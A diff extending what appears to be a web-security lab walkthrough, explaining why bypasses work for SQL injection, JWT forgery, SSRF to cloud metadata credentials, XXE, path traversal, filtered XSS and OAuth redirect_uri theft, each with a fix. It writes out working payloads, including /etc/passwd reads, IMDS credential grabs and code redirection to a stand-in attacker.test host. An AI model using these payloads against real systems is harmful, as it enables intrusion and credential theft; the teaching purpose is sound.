@@ -161,3 +161,126 @@ $B/greet.php?name=<img src=x onerror=alert(document.domain)>        # no <script
 $B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: inner <script> removed -> <script> remains
 ```
 **Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: XSS_02_Payloads · XSS_06_CSP_Bypass.
+
+---
+# 🧠 Why each bypass works — mechanism & examples
+
+The sections above give the *payloads*. Here is **the vulnerable pattern, why it's exploitable, and why
+each level's bypass defeats that level's defence.**
+
+## 1. UNION SQL injection — read other tables through the search
+**Mechanism.** `"...name LIKE '$q%'"` with **3 output columns**. A `UNION SELECT` appends your own rows
+from any table, as long as the column **count matches** (and types are compatible).
+```
+' ORDER BY 3-- -        -> ok      (there are 3 columns)
+' ORDER BY 4-- -        -> error   (so you know it's exactly 3)
+' UNION SELECT k,v,3 FROM secrets-- -     -> your rows render alongside the products
+```
+*Why it works:* your input leaves the string literal and becomes SQL; `UNION` stitches a second result
+set onto the first. The `users` table mixes several hash algorithms on purpose — a **hash-ID drill**
+(32 hex = MD5, 40 = SHA-1, 64 = SHA-256, `$2y$` = bcrypt): dump `username:hash:salt`, identify, crack with
+the matching mode. **Fix:** prepared statements + a least-privilege DB account.
+
+## 2. JWT forgery — the server trusts the token it was handed
+**Mechanism.** A JWT is `base64url(header).base64url(payload).signature`. The verifier here trusts the
+token's *own* `alg` header, and the HMAC secret is weak — two independent forgeries:
+```
+alg:none     header {"alg":"none"}  payload {"role":"admin"}  signature EMPTY (keep the trailing dot)
+             -> the 'none' branch returns the payload WITHOUT checking a signature → you pick the claims
+weak secret  HS256 is symmetric (sign == verify key). The secret is 'secret' → crack it offline:
+             hashcat -m 16500 token.jwt rockyou.txt   then re-sign role=admin with it
+```
+**Per level:** `alg:none` → crack `secret` → crack `superman` → **expert**: the secret is strong but is
+itself stored in `secrets` → dump it with §1's SQLi, then sign (**a SQLi → JWT chain**).
+*Why it works:* trusting the client-supplied `alg`, and using a guessable/leaked signing key, both let the
+attacker mint a token the server accepts. **Fix:** pin the expected algorithm server-side, reject `none`,
+use a strong random secret (or RS256 — verify with a public key the attacker can't sign with).
+
+## 3. SSRF — the server fetches a URL you choose
+**Mechanism.** `file_get_contents($url)` with **no scheme/host allow-list** → you aim the *server's*
+network position at the cloud metadata service or local files. The crown jewel is the AWS IMDS chain:
+```
+/latest/meta-data/  →  iam/security-credentials/  →  web01-stg-role  →  AccessKeyId/SecretKey/Token
+```
+**Why the per-level encodings all work — host normalization (`inet_aton`).** The filter blacklists the
+*string* `169.254.169.254`, but the fetcher (like a real resolver) accepts the IP written many ways and
+normalizes them all back to the same address:
+```
+169.254.169.254   = 0xA9FEA9FE
+medium  decimal      http://2852039166/…           (= 0xA9FEA9FE)         literal IP string blocked
+hard    octal        http://0251.0376.0251.0376/…  (0251=169, 0376=254)   decimal + 0x hex blocked
+expert  IPv6-mapped  http://[::ffff:a9fe:a9fe]/…   (a9fe:a9fe = the same) octal + file:// blocked
+```
+**GCP/Azure need a request header** (a real nuance): GCP returns **403** without `Metadata-Flavor: Google`;
+Azure needs `Metadata: true` — a naive header-less SSRF fails there (the fetcher lets you add `&header=`).
+**Fix:** allow-list scheme (`https`) + destination host, block link-local/private ranges **after**
+normalization/DNS, and require IMDSv2 (a PUT session token, which a plain GET SSRF can't obtain).
+
+## 4. XXE — the XML parser resolves external entities
+**Mechanism.** `DOMDocument::loadXML($xml, LIBXML_NOENT|LIBXML_DTDLOAD)` enables DTD loading + entity
+substitution, so a `SYSTEM` entity you define is **fetched and inlined** where you reference it:
+```
+<!DOCTYPE o [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>  …  <item>&e;</item>   → &e; becomes the file
+```
+**Per level** — each level bans the keyword/scheme the previous payload used:
+```
+easy    SYSTEM + file://
+medium  PUBLIC "x" "file:///etc/passwd"                      'SYSTEM' blocked (PUBLIC also loads external)
+hard    php://filter/convert.base64-encode/resource=/etc/passwd   'file:' blocked → wrapper, decode b64
+expert  php://filter/read=string.rot13/resource=/etc/passwd       'base64' blocked → rot13 it back
+```
+*Why it works:* the parser is told to trust and expand external entities. **Fix:** disable DTDs/external
+entities (don't set `NOENT|DTDLOAD`; `libxml_disable_entity_loader(true)` on old PHP) — a document never
+needs to read the server's files.
+
+## 5. Path traversal / source disclosure — a string becomes a file path
+**Mechanism.** `readfile(__DIR__."/docs/".$file)` → `../` climbs out of `docs/`. For a **.php** file you
+use `php://filter/convert.base64-encode/resource=…` because reading it normally would **execute** it —
+the filter hands you its raw **source** (where DB creds live) to base64-decode.
+*Finding `db.php`:* base64-read a file you KNOW exists (`resource=home.php`/`download.php`), decode, read
+its `require/include` lines → they name the next files; or fuzz `db.php`/`config.php`.
+**Fix:** allow-list filenames, `realpath()` + confirm the result stays under `docs/`, disable wrappers.
+
+## 6. Filtered reflected XSS — a one-pass blacklist
+**Mechanism.** `str_ireplace('<script>','', $name)` once, then echoed unencoded. Two ways past it:
+```
+<img src=x onerror=alert(document.cookie)>     there's no "<script>" substring at all → nothing to strip
+<scr<script>ipt>alert(1)</scr</script>ipt>     removing the INNER "<script>" rejoins the outer halves
+```
+*Why it works:* a single-pass substring removal can't cover the many JS sinks, and nesting rebuilds the
+tag after the pass. **Fix:** output-encode (`htmlspecialchars`), don't blacklist. (Then chain to cookie
+theft as in app-1 §8 — the `flag` cookie is non-HttpOnly.)
+
+## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
+**Mechanism.** The authorization endpoint issues the signed-in victim's one-time **code** and redirects
+the browser to the `redirect_uri` **without checking it against the client's registered callback**. Point
+it at a host you control → you receive the victim's code → replay it → logged in as them.
+```
+registered (legit):  http://localhost:8001/oauth_callback.php
+attacker's:          http://<attacker-host>/cb          ← /cb is just a PATH on the attacker's server
+```
+**What `/cb` is:** the path where the attacker's listener catches the incoming `?code=…`. It's arbitrary
+(`/cb`, `/callback`, `/`, `/steal` all work) — only the **host** matters. The lab doesn't actually fetch
+your URL; it prints the `Location:` it *would* send, so you see the code leave (`attacker.test`/`attacker`
+are illustrative and don't resolve — the point is the server **accepted** an untrusted `redirect_uri`).
+
+**Per level** — each adds a naive string check on the raw `redirect_uri` that you sidestep:
+```
+easy    http://attacker.test/cb                 no validation at all
+medium  http://attacker.test/?x=localhost       must CONTAIN 'localhost' → put it in the QUERY
+                                                   (host stays attacker.test; the check sees "localhost")
+hard    http://localhost.attacker.test/cb       must START WITH http://localhost → SUBDOMAIN trick:
+                                                   host = localhost.attacker.test (an attacker domain)
+expert  http://localhost@attacker/cb            start-with + NO dots → @ USERINFO trick:
+                                                   everything before @ is a username; real host = attacker
+```
+*Why hard works:* `localhost.attacker.test` literally starts with `http://localhost`, but the registrable
+domain is `attacker.test`. *Why expert works:* in `scheme://user@host/path`, `localhost` is the
+**userinfo** (a username) and the real **host is after `@`** (`attacker`), with no dots → both checks
+fooled. Then replay the code:
+```
+oauth_callback.php?code=<CODE>        → FLAG{oauth_redirect_uri_not_validated} (authenticated as admin)
+```
+**Fix:** never prefix/substring-match the raw string. **Parse** the URL and compare the full redirect (or
+at least the parsed **host**) against an exact allow-list — every payload above has a host that is *not*
+your registered `localhost`, which strict parsing rejects.
